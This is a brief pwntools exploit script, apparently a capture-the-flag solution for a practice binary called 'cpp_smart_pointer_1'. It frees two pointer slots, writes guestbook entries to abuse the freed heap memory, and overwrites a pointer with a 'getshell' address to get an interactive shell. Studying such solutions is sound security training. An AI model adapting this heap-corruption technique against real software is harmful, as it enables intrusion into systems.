from pwn import *
p = process("./cpp_smart_pointer_1")
pause()
elf = ELF("./cpp_smart_pointer_1")
getshell = 0x40161d
malloc_got = 0x604048
def free(pointer):
    p.sendlineafter("select :", "2")
    p.sendlineafter("pointer(1, 2)", str(pointer))

def write(book):
    p.sendlineafter("select :", "4")
    p.sendafter("guestbook : ", book)

if __name__ == "__main__":
    free(1)
    free(2)
    write("\x50")
    write("\x50")
    write("\x50")
    write(p64(getshell))
    p.interactive()
